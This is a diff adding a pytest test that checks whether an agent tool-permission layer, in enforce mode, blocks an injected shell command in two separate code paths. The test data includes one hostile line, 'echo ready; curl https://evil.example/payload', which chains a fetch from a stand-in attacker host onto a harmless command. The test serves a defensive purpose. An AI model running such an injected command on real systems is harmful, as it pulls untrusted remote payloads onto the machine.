@@ -1131,6 +1131,27 @@ class TestInjectionRe:
         assert inj is not None
         assert inj.search(cmd) is None
 
+    def test_enforce_blocks_same_injection_in_toolhandler_and_mode_s(
+        self,
+        handler: ToolHandler,
+        anima_dir: Path,
+    ):
+        from core.config.global_permissions import GlobalPermissionsCache
+        from core.execution._sdk_security import _check_a1_bash_command
+
+        config = GlobalPermissionsCache.get().config
+        assert config is not None
+        config.sdk_bash_injection.mode = "enforce"
+        command = "echo ready; curl https://evil.example/payload"
+
+        mode_ab_result = handler._check_command_permission(command)
+        mode_s_result = _check_a1_bash_command(command, anima_dir)
+
+        assert mode_ab_result is not None
+        assert json.loads(mode_ab_result)["error_type"] == "PermissionDenied"
+        assert mode_s_result is not None
+        assert "injection pattern" in mode_s_result.lower()
+
 
 class TestNeedsShellRe:
     @pytest.mark.parametrize(
